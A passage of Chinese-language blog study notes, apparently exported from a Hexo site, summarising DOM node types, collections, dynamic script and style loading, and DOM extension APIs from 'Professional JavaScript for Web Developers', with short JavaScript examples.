特性（attribute）严格匹配，包括大小写。</p>\n<p>getElementsByTagName()，返回一个 NodeList，在 HTML 文档中对应的是 HTMLCollection 对象。<br>对 HTMLCollection 而言，我们可以向方括号中传入数值或字符串形式的索引值。在后台，对数<br>值索引就会调用 item()，而对字符串索引就会调用 namedItem()。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> images = <span class=\"built_in\">document</span>.getElementsByTagName(<span class=\"string\">\"img\"</span>);</span><br><span class=\"line\">alert(images.length); <span class=\"comment\">//输出图像的数量</span></span><br><span class=\"line\">alert(images[<span class=\"number\">0</span>].src); <span class=\"comment\">//输出第一个图像元素的src 特性</span></span><br><span class=\"line\">alert(images.item(<span class=\"number\">0</span>).src); <span class=\"comment\">//输出第一个图像元素的 src 特性</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// &lt;img src=\"myimage.gif\" name=\"myImage\"&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> myImage = images.namedItem(<span class=\"string\">\"myImage\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> myImage = images[<span class=\"string\">\"myImage\"</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> allElements = <span class=\"built_in\">document</span>.getElementsByTagName(<span class=\"string\">\"*\"</span>);</span><br></pre></td></tr></table></figure>\n<p>getElementsByName()，只有 HTMLDocument 类型才有的方法。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">fieldset</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">legend</span>&gt;</span>Which color do you prefer?<span class=\"tag\">&lt;/<span class=\"name\">legend</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">ul</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"radio\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"red\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"color\"</span> <span class=\"attr\">id</span>=<span class=\"string\">\"colorRed\"</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">label</span> <span class=\"attr\">for</span>=<span class=\"string\">\"colorRed\"</span>&gt;</span>Red<span class=\"tag\">&lt;/<span class=\"name\">label</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"radio\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"green\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"color\"</span> <span class=\"attr\">id</span>=<span class=\"string\">\"colorGreen\"</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">label</span> <span class=\"attr\">for</span>=<span class=\"string\">\"colorGreen\"</span>&gt;</span>Green<span class=\"tag\">&lt;/<span class=\"name\">label</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"radio\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"blue\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"color\"</span> <span class=\"attr\">id</span>=<span class=\"string\">\"colorBlue\"</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">label</span> <span class=\"attr\">for</span>=<span class=\"string\">\"colorBlue\"</span>&gt;</span>Blue<span class=\"tag\">&lt;/<span class=\"name\">label</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">fieldset</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> radios = <span class=\"built_in\">document</span>.getElementsByName(<span class=\"string\">\"color\"</span>);</span><br></pre></td></tr></table></figure>\n<h4 id=\"特殊集合\"><a href=\"#特殊集合\" class=\"headerlink\" title=\"特殊集合\"></a>特殊集合</h4><p>除了属性和方法，document 对象还有一些特殊的集合。这些集合都是 HTMLCollection 对象，<br>为访问文档常用的部分提供了快捷方式，包括：</p>\n<ul>\n<li>document.anchors，包含文档中所有带 name 特性的<code>&lt;a&gt;</code>元素；</li>\n<li>document.applets，包含文档中所有的<code>&lt;applet&gt;</code>元素，因为不再推荐使用<code>&lt;applet&gt;</code>元素，所以这个集合已经不建议使用了；</li>\n<li>document.forms，包含文档中所有的<code>&lt;form&gt;</code>元素，与 document.getElementsByTagName(“form”)得到的结果相同；</li>\n<li>document.images，包含文档中所有的<code>&lt;img&gt;</code>元素，与 document.getElementsByTagName(“img”)得到的结果相同；</li>\n<li>document.links，包含文档中所有带 href 特性的<code>&lt;a&gt;</code>元素。</li>\n</ul>\n<h4 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">document</span>.implementation.hasFeature();</span><br><span class=\"line\"><span class=\"built_in\">document</span>.write();</span><br><span class=\"line\"><span class=\"built_in\">document</span>.writeln();</span><br><span class=\"line\"><span class=\"built_in\">document</span>.open();</span><br><span class=\"line\"><span class=\"built_in\">document</span>.close();</span><br></pre></td></tr></table></figure>\n<h3 id=\"Element-类型\"><a href=\"#Element-类型\" class=\"headerlink\" title=\"Element 类型\"></a>Element 类型</h3><p>Element 类型用于表现 XML 或 HTML 元素，提供了对元素标签名、子节点及特性的访问。Element 节点具有以下特征：</p>\n<ul>\n<li>nodeType 的值为 1；</li>\n<li>nodeName 的值为元素的标签名；</li>\n<li>nodeValue 的值为 null；</li>\n<li>parentNode 可能是 Document 或 Element；</li>\n<li>其子节点可能是 Element、Text、Comment、ProcessingInstruction、CDATASection 或 EntityReference。<br>要访问元素的标签名，可以使用 nodeName 属性，也可以使用 tagName 属性。</li>\n</ul>\n<p>对于标签名，HTML 中始终返回全大写，XML 中返回与源代码中一致，因此，实践中通常直接用 toLowerCase()转换后比较。如下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// &lt;div id=\"myDiv\"&gt;&lt;/div&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> div = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">\"myDiv\"</span>);</span><br><span class=\"line\">alert(div.tagName); <span class=\"comment\">//\"DIV\"</span></span><br><span class=\"line\">alert(div.tagName == div.nodeName); <span class=\"comment\">//true</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (element.tagName == <span class=\"string\">\"div\"</span>) &#123;</span><br><span class=\"line\">  <span class=\"comment\">//不能这样比较，很容易出错！</span></span><br><span class=\"line\">  <span class=\"comment\">//在此执行某些操作</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (element.tagName.toLowerCase() == <span class=\"string\">\"div\"</span>) &#123;</span><br><span class=\"line\">  <span class=\"comment\">//这样最好（适用于任何文档）</span></span><br><span class=\"line\">  <span class=\"comment\">//在此执行某些操作</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"HTML-元素\"><a href=\"#HTML-元素\" class=\"headerlink\" title=\"HTML 元素\"></a>HTML 元素</h4><p>对应的对象共有的读写属性有：<code>id,title,className,lang,dir</code></p>\n<h4 id=\"操作特性\"><a href=\"#操作特性\" class=\"headerlink\" title=\"操作特性\"></a>操作特性</h4><p>getAttribute()、setAttribute()、removeAttribute()、setAttribute()</p>\n<p>特性名称不区分大小写，自定义特性加 data-前缀。</p>\n<p>实践中，操作特性，常用对象的属性（div.id），只有自定义特性才用 getAttribute()、setAttribute()。</p>\n<h4 id=\"attributes-属性\"><a href=\"#attributes-属性\" class=\"headerlink\" title=\"attributes 属性\"></a>attributes 属性</h4><p>一般只在遍历元素的属性时使用，例如：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">outputAttributes</span>(<span class=\"params\">element</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> pairs = <span class=\"keyword\">new</span> <span class=\"built_in\">Array</span>(),</span><br><span class=\"line\">    attrName,</span><br><span class=\"line\">    attrValue,</span><br><span class=\"line\">    i,</span><br><span class=\"line\">    len;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>, len = element.attributes.length; i &lt; len; i++) &#123;</span><br><span class=\"line\">    attrName = element.attributes[i].nodeName;</span><br><span class=\"line\">    attrValue = element.attributes[i].nodeValue;</span><br><span class=\"line\">    pairs.push(attrName + <span class=\"string\">'=\"'</span> + attrValue + <span class=\"string\">'\"'</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> pairs.join(<span class=\"string\">\" \"</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"创建元素\"><a href=\"#创建元素\" class=\"headerlink\" title=\"创建元素\"></a>创建元素</h4><p>document.createElement()，一个参数，要创建元素的标签名。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> div = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"div\"</span>);</span><br></pre></td></tr></table></figure>\n<h4 id=\"元素的子节点\"><a href=\"#元素的子节点\" class=\"headerlink\" title=\"元素的子节点\"></a>元素的子节点</h4><p>大部分浏览器中，空格、换行都会作为元素的子节点，因此实践中会先检查 nodeType 属性，如下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>, len = element.childNodes.length; i &lt; len; i++) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (element.childNodes[i].nodeType == <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">    <span class=\"comment\">//执行某些操作</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"Text-类型\"><a href=\"#Text-类型\" class=\"headerlink\" title=\"Text 类型\"></a>Text 类型</h3><p>文本节点由 Text 类型表示，包含的是可以照字面解释的纯文本内容。纯文本中可以包含转义后的 HTML 字符，但不能包含 HTML 代码。Text 节点具有以下特征：</p>\n<ul>\n<li>nodeType 的值为 3；</li>\n<li>nodeName 的值为”#text”；</li>\n<li>nodeValue 的值为节点所包含的文本；</li>\n<li>parentNode 是一个 Element；</li>\n<li>不支持（没有）子节点。</li>\n</ul>\n<p>可以通过 nodeValue 属性或 data 属性访问 Text 节点中包含的文本，这两个属性中包含的值相同。对 nodeValue 的修改也会通过 data 反映出来，反之亦然。使用下列方法可以操作节点中的文本。</p>\n<ul>\n<li>appendData(text)：将 text 添加到节点的末尾。</li>\n<li>deleteData(offset, count)：从 offset 指定的位置开始删除 count 个字符。</li>\n<li>insertData(offset, text)：在 offset 指定的位置插入 text。</li>\n<li>replaceData(offset, count, text)：用 text 替换从 offset 指定的位置开始到 offset+count 为止处的文本。</li>\n<li>splitText(offset)：从 offset 指定的位置将当前文本节点分成两个文本节点。</li>\n<li>substringData(offset, count)：提取从 offset 指定的位置开始到 offset+count 为止处的字符串。</li>\n</ul>\n<p>length 属性，保存着节点中字符的数目。</p>\n<h4 id=\"创建文本节点\"><a href=\"#创建文本节点\" class=\"headerlink\" title=\"创建文本节点\"></a>创建文本节点</h4><p>document.createTextNode()，一个参数，要插入节点中的文本。</p>\n<h4 id=\"规范化文本节点\"><a href=\"#规范化文本节点\" class=\"headerlink\" title=\"规范化文本节点\"></a>规范化文本节点</h4><p>normalize()，在父元素上调用该方法，会把所有文本节点合并成一个节点。</p>\n<h4 id=\"分割文本节点\"><a href=\"#分割文本节点\" class=\"headerlink\" title=\"分割文本节点\"></a>分割文本节点</h4><p>splitText()，一个参数，指定位置分割文本节点。原来的文本节点将包含从开始到指定位置之前的内容，新文本节点将包含剩下的文本。</p>\n<h3 id=\"其他类型\"><a href=\"#其他类型\" class=\"headerlink\" title=\"其他类型\"></a>其他类型</h3><p>了解 Comment 类型，CDATASection 类型，DocumentType 类型，DocumentFragment 类型，Attr 类型。重点关注下 DocumentFragment 类型，是一种“轻量级”的文档，对于节点在文档与文档片段间的添加，若存在则是移动而不是复制。实践中常作为“仓库”使用，可以避免浏览器反复渲染。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> fragment = <span class=\"built_in\">document</span>.createDocumentFragment();</span><br><span class=\"line\"><span class=\"keyword\">var</span> ul = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">\"myList\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> li = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">3</span>; i++) &#123;</span><br><span class=\"line\">  li = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"li\"</span>);</span><br><span class=\"line\">  li.appendChild(<span class=\"built_in\">document</span>.createTextNode(<span class=\"string\">\"Item \"</span> + (i + <span class=\"number\">1</span>)));</span><br><span class=\"line\">  fragment.appendChild(li);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">ul.appendChild(fragment);</span><br></pre></td></tr></table></figure>\n<h2 id=\"DOM-操作技术\"><a href=\"#DOM-操作技术\" class=\"headerlink\" title=\"DOM 操作技术\"></a>DOM 操作技术</h2><h3 id=\"动态脚本\"><a href=\"#动态脚本\" class=\"headerlink\" title=\"动态脚本\"></a>动态脚本</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">loadScript</span>(<span class=\"params\">url</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> script = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"script\"</span>);</span><br><span class=\"line\">  script.type = <span class=\"string\">\"text/javascript\"</span>;</span><br><span class=\"line\">  script.src = url;</span><br><span class=\"line\">  <span class=\"built_in\">document</span>.body.appendChild(script);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// loadScript(\"client.js\");</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">loadScriptString</span>(<span class=\"params\">code</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> script = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"script\"</span>);</span><br><span class=\"line\">  script.type = <span class=\"string\">\"text/javascript\"</span>;</span><br><span class=\"line\">  <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">    script.appendChild(<span class=\"built_in\">document</span>.createTextNode(code));</span><br><span class=\"line\">  &#125; <span class=\"keyword\">catch</span> (ex) &#123;</span><br><span class=\"line\">    script.text = code;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">document</span>.body.appendChild(script);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// loadScriptString(\"function sayHi()&#123;alert('hi');&#125;\");</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"动态样式\"><a href=\"#动态样式\" class=\"headerlink\" title=\"动态样式\"></a>动态样式</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">loadStyles</span>(<span class=\"params\">url</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> link = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"link\"</span>);</span><br><span class=\"line\">  link.rel = <span class=\"string\">\"stylesheet\"</span>;</span><br><span class=\"line\">  link.type = <span class=\"string\">\"text/css\"</span>;</span><br><span class=\"line\">  link.href = url;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> head = <span class=\"built_in\">document</span>.getElementsByTagName(<span class=\"string\">\"head\"</span>)[<span class=\"number\">0</span>];</span><br><span class=\"line\">  head.appendChild(link);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// loadStyles(\"styles.css\");</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">loadStyleString</span>(<span class=\"params\">css</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> style = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"style\"</span>);</span><br><span class=\"line\">  style.type = <span class=\"string\">\"text/css\"</span>;</span><br><span class=\"line\">  <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">    style.appendChild(<span class=\"built_in\">document</span>.createTextNode(css));</span><br><span class=\"line\">  &#125; <span class=\"keyword\">catch</span> (ex) &#123;</span><br><span class=\"line\">    style.styleSheet.cssText = css;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> head = <span class=\"built_in\">document</span>.getElementsByTagName(<span class=\"string\">\"head\"</span>)[<span class=\"number\">0</span>];</span><br><span class=\"line\">  head.appendChild(style);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// loadStyleString(\"body&#123;background-color:red&#125;\");</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"操作表格\"><a href=\"#操作表格\" class=\"headerlink\" title=\"操作表格\"></a>操作表格</h3><p>可以用核心 DOM 方法也可以用 HTML DOM 为<code>&lt;table&gt;</code>、<code>&lt;tbody&gt;</code>和<code>&lt;tr&gt;</code>元素添加的属性和方法。由于实践中较少使用，这里不一一列举。</p>\n<h3 id=\"使用-NodeList\"><a href=\"#使用-NodeList\" class=\"headerlink\" title=\"使用 NodeList\"></a>使用 NodeList</h3><p>理解 NodeList 及其“近亲”NamedNodeMap 和 HTMLCollection，是从整体上透彻理解 DOM 的<br>关键所在。这三个集合都是“动态的”；换句话说，每当文档结构发生变化时，它们都会得到更新。因<br>此，它们始终都会保存着最新、最准确的信息。从本质上说，所有 NodeList 对象都是在访问 DOM 文<br>档时实时运行的查询。例如，下列代码会导致无限循环：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> divs = <span class=\"built_in\">document</span>.getElementsByTagName(<span class=\"string\">\"div\"</span>),</span><br><span class=\"line\">  i,</span><br><span class=\"line\">  div;</span><br><span class=\"line\"><span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; divs.length; i++) &#123;</span><br><span class=\"line\">  div = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"div\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">document</span>.body.appendChild(div);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 解决方法</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> divs = <span class=\"built_in\">document</span>.getElementsByTagName(<span class=\"string\">\"div\"</span>),</span><br><span class=\"line\">  i,</span><br><span class=\"line\">  len,</span><br><span class=\"line\">  div;</span><br><span class=\"line\"><span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>, len = divs.length; i &lt; len; i++) &#123;</span><br><span class=\"line\">  div = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"div\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">document</span>.body.appendChild(div);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>实践中，由于 NodeList 的操作开销很大，因此一般都是把 NodeList 取得的值缓存起来。</p>\n<h1 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h1>"},{"title":"DOM扩展（《JavaScript高级程序设计》）","date":"2019-01-30T13:32:08.000Z","updated":"2019-01-30T13:32:08.000Z","_content":"# 前言\n重读《JavaScript高级程序设计》，温故而知新。\n# 概述\n重点掌握\n1. 选择符API\n`querySelector,querySelectorAll,matchesSelector`\n2. 元素遍历\n`childElementCount,firstElementChild,lastElementChild,previouseElementSibling,nextElementSibling`\n3. 其他\n`getElementsByClassName,classList,activeElement,hasFocus,readyState,compatMode,head,charset,innerHTML,innerText`\n\n<!-- more -->\n# 详述\n## 选择符 API\nquerySelector()方法接收一个 CSS 选择符，返回与该模式匹配的第一个元素，如果没有找到匹配的元素，返回 null。\n\nquerySelectorAll()方法接收的参数与 querySelector()方法一样，都是一个 CSS 选择符，但返回的是所有匹配的元素而不仅仅是一个元素。这个方法返回的是一个 类 NodeList 的实例，但是是快照非动态查询。\n\nSelectors API Level 2规范为Element类型新增了一个方法matchesSelector()。这个方法接收 一个参数，即 CSS 选择符，如果调用元素与该选择符匹配，返回 true;否则，返回 false。看例子。\n```js\nif (document.body.matchesSelector(\"body.page1\")){\n  //true\n}\n// 兼容写法\nfunction matchesSelector(element, selector){\n        if (element.matchesSelector){\n            return element.matchesSelector(selector);\n        } else if (element.msMatchesSelector){\n            return element.msMatchesSelector(selector);\n        } else if (element.mozMatchesSelector){\n            return element.mozMatchesSelector(selector);\n        } else if (element.webkitMatchesSelector){\n            return element.webkitMatchesSelector(selector);\n        } else {\n            throw new Error(\"Not supported.\");\n        }\n}\nif (matchesSelector(document.body, \"body.page1\")){ //执行操作\n}\n```\n\n\n\n## 元素遍历\nElement Traversal API 为 DOM 元素添加了以下 5 个属性。\n- childElementCount:返回子元素(不包括文本节点和注释)的个数。\n- firstElementChild:指向第一个子元素;firstChild 的元素版。\n- lastElementChild:指向最后一个子元素;lastChild 的元素版。\n- previousElementSibling:指向前一个同辈元素;previousSibling 的元素版。 \n- nextElementSibling:指向后一个同辈元素;nextSibling 的元素版。\n\n兼容性：IE 9+、Firefox 3.5+、Safari 4+、Chrome 和 Opera 10+\n\n## HTML5\n### getElementsByClassName()方法\ngetElementsByClassName()方法接收一个参数，即一个包含一或多个类名的字符串，返回带有 指定类的所有元素的 NodeList。传入多个类名时，类名的先后顺序不重要。注意，同样可能涉及性能问题。\n```js\n//取得所有类中包含\"username\"和\"current\"的元素，类名的先后顺序无所谓\nvar allCurrentUsernames = document.getElementsByClassName(\"username current\");\n```\n\n### classList 属性\n这个 classList 属性是新集合类型 DOMTokenList 的实例。与其他 DOM 集合类似，有length属性，每个元素可以用item()方法或者方括号语法访问。\n\n add(value):将给定的字符串值添加到列表中。如果值已经存在，就不添加了。\n contains(value):表示列表中是否存在给定的值，如果存在则返回 true，否则返回 false。 2  remove(value):从列表中删除给定的字符串。\n toggle(value):如果列表中已经存在给定的值，删除它;如果列表中没有给定的值，添加它。\n```js\n//删除\"disabled\"类 \ndiv.classList.remove(\"disabled\");\n//添加\"current\"类 \n div.classList.add(\"current\");\n//切换\"user\"类 \ndiv.classList.toggle(\"user\");\n//确定元素中是否包含既定的类名\nif (div.classList.contains(\"bd\") && !div.classList.contains(\"disabled\")){\n  //执行操作 \n)\n //迭代类名\nfor (var i=0, len=div.classList.length; i < len; i++){\n  doSomething(div.classList[i]);\n}\n```\n兼容性： Firefox 3.6+和 Chrome。\n\n### 焦点管理\ndocument.activeElement,document.hasFocus()\n\n```js\nvar button = document.getElementById(\"myButton\");\nbutton.focus();\nalert(document.activeElement === button);   //true\n\nvar button = document.getElementById(\"myButton\");\nbutton.focus();\nalert(document.hasFocus());  //true\n```\n兼容性：IE 4+、Firefox 3+、Safari 4+、Chrome 和 Opera 8+\n\n### HTMLDocument的变化\nreadyState 属性\nDocument 的 readyState 属性有两个可能的值:\n- loading，正在加载文档;\n- complete，已经加载完文档。\n```js\nif (document.readyState == \"complete\"){ \n  //执行操作\n}\n```\n兼容模式\n```js\nif (document.compatMode == \"CSS1Compat\"){\n        alert(\"Standards mode\");\n    } else {\n        alert(\"Quirks mode\");\n}\n```\nhead属性\n```js\nvar head = document.head || document.getElementsByTagName(\"head\")[0];\n```\n\n### 字符集属性\ncharset 和 defaultCharset\n```js\nalert(document.charset); //\"UTF-16\"\ndocument.charset = \"UTF-8\";\n```\n\n### 自定义数据属性\n以data-开头，用元素的dataset属性访问。\n```js\n<div id=\"myDiv\" data-appId=\"12345\" data-myname=\"Nicholas\"></div>\n\n//本例中使用的方法仅用于演示\nvar div = document.getElementById(\"myDiv\");\n//取得自定义属性的值\nvar appId = div.dataset.appId; var myName = div.dataset.myname;\n//设置值\ndiv.dataset.appId = 23456; div.dataset.myname = \"Michael\";\n//有没有\"myname\"值呢?\nif (div.dataset.myname){\n  alert(\"Hello, \" + div.dataset.myname);\n}\n```\n\n### 插入标记\n#### innerHTML 属性\n```js\ndiv.innerHTML = \"Hello world!\";\ndiv.innerHTML = \"Hello & 